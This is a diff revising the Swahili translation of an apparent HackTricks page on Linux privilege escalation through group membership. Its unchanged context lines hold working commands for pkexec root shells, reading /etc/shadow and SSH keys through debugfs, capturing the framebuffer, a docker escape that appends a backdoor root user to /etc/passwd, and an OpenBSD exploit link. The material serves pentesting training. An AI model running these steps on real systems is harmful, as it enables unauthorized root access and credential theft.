@@ -31,19 +31,19 @@ Hii ni kwa sababu kawaida hizo ndizo vikundi ndani ya **polkit policy**. Sera hi
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa kawaida** katika baadhi ya disktros za linux vikundi **sudo** na **admin** vinajitokeza.
+Hapa utaona ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa kawaida** katika baadhi ya disktros za linux vikundi **sudo** na **admin** vinajitokeza.
 
 Ili **kuwa root unaweza kutekeleza**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-Ikiwa unajaribu kutekeleza **pkexec** na unapata **error** hii:
+Ikiwa unajaribu kutekeleza **pkexec** na unapata **makosa** haya:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho la tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sessions 2 tofauti za ssh**:
+**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sehemu 2 tofauti za ssh**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -68,17 +68,17 @@ sudo su
 ```
 ## Shadow Group
 
-Watumiaji kutoka **group shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
+Watumiaji kutoka **group shadow** wanaweza **kusoma** faili **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-So, read the file and try to **crack some hashes**.
+So, soma faili na jaribu **kufungua baadhi ya hashes**.
 
-## Staff Group
+## Kundi la Wafanyakazi
 
-**staff**: Inaruhusu watumiaji kuongeza mabadiliko ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za mzizi (zingatia kwamba executable katika `/usr/local/bin` ziko kwenye mabadiliko ya PATH ya mtumiaji yeyote, na zinaweza "kufunika" executable katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kundi "adm", ambalo lina uhusiano zaidi na ufuatiliaji/usalama. [\[source\]](https://wiki.debian.org/SystemGroups)
+**staff**: Inaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za mzizi (zingatia kwamba executable katika `/usr/local/bin` ziko kwenye mabadiliko ya PATH ya mtumiaji yeyote, na zinaweza "kufunika" executable katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kundi "adm", ambalo lina uhusiano zaidi na ufuatiliaji/usalama. [\[source\]](https://wiki.debian.org/SystemGroups)
 
-Katika usambazaji wa debian, mabadiliko ya `$PATH` yanaonyesha kwamba `/usr/local/` itatekelezwa kama kipaumbele cha juu zaidi, iwe wewe ni mtumiaji mwenye ruhusa au la.
+Katika usambazaji wa debian, mabadiliko ya `$PATH` yanaonyesha kwamba `/usr/local/` itatekelezwa kama kipaumbele cha juu, iwe wewe ni mtumiaji mwenye mamlaka au la.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -96,7 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-au Wakati wa kuingia kwa kikao kipya cha ssh.
+au Wakati wa kuingia kwenye kikao kipya cha ssh.
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -141,29 +141,29 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Kumbuka kwamba ukitumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
+Kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Permission denied**".
+Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".
 
-## Video Group
+## Kundi la Video
 
-Kwa kutumia amri `w` unaweza kupata **nani aliyeingia kwenye mfumo** na itatoa matokeo kama ifuatavyo:
+Kwa kutumia amri `w` unaweza kupata **nani amejiandikisha kwenye mfumo** na itatoa matokeo kama ifuatavyo:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1** inamaanisha kwamba mtumiaji **yossi amejiandikisha kimwili** kwenye terminal kwenye mashine.
+The **tty1** inamaanisha kwamba mtumiaji **yossi amejiandikisha kimwili** kwenye terminal kwenye mashine.
 
 Kikundi cha **video** kina ufikiaji wa kuangalia matokeo ya skrini. Kimsingi unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** katika data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuhifadhiwa katika `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Ili **kufungua** **picha ya raw** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua kama aina ya faili **Raw image data**:
+Ili **kufungua** **picha ya raw** unaweza kutumia **GIMP**, chagua faili **`screen.raw`** na chagua kama aina ya faili **Data ya picha ya raw**:
 
 ![](<../../../images/image (463).png>)
 
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Docker Group
 
-Unaweza **kushikilia mfumo wa faili wa mzazi wa mashine kwenye kiasi cha mfano**, hivyo wakati mfano unapoanza inapoanza mara moja inachukua `chroot` kwenye kiasi hicho. Hii kwa ufanisi inakupa root kwenye mashine.
+Unaweza **kushikilia mfumo wa faili wa mizizi wa mashine mwenyeji kwenye kiasi cha mfano**, hivyo wakati mfano unapoanza inachukua mara moja `chroot` kwenye kiasi hicho. Hii inakupa kwa ufanisi mizizi kwenye mashine.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,13 +193,13 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Hatimaye, ikiwa hupendi yoyote ya mapendekezo ya awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?) unaweza kila wakati kujaribu **kufanya kazi kwenye kontena lenye mamlaka na kutoroka kutoka kwake** kama ilivyoelezwa hapa:
+Hatimaye, ikiwa hupendi mapendekezo yoyote ya awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?) unaweza kila wakati kujaribu **kufanya kazi kwenye kontena lenye mamlaka na kutoroka kutoka kwake** kama ilivyoelezwa hapa:
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-Ikiwa una ruhusa za kuandika juu ya socket ya docker soma [**hii chapisho kuhusu jinsi ya kupandisha mamlaka kwa kutumia socket ya docker**](../index.html#writable-docker-socket)**.**
+Ikiwa una ruhusa za kuandika juu ya socket ya docker soma [**hiki kipande kuhusu jinsi ya kupandisha mamlaka kwa kutumia socket ya docker**](../index.html#writable-docker-socket)**.**
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
@@ -217,12 +217,12 @@ https://fosterelli.co/privilege-escalation-via-docker.html
 
 ## Kundi la Adm
 
-Kwa kawaida **wanachama** wa kundi **`adm`** wana ruhusa za **kusoma** faili za log zilizopo ndani ya _/var/log/_.\
+Kawaida **wanachama** wa kundi **`adm`** wana ruhusa za **kusoma faili za log** zilizopo ndani ya _/var/log/_.\
 Hivyo, ikiwa umepata mtumiaji ndani ya kundi hili unapaswa kwa hakika kuangalia **logi**.
 
 ## Kundi la Auth
 
-Ndani ya OpenBSD kundi la **auth** kwa kawaida linaweza kuandika katika folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
+Ndani ya OpenBSD kundi la **auth** kawaida linaweza kuandika katika folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
 Ruhusa hizi zinaweza kutumika vibaya kwa kutumia exploit ifuatayo ili **kupandisha mamlaka** hadi root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
